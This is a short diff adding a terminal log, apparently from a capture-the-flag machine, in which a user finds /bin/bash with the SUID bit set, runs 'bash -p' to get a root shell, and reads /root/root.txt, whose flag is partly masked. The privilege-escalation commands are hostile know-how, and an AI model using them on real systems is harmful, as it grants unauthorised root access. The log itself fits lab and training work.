@@ -1,0 +1,5 @@
+s***b@smarthire:~$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
+s***b@smarthire:~$ /bin/bash -p
+bash-5.1# cat /root/root.txt
+148215ca*****7593c80091a
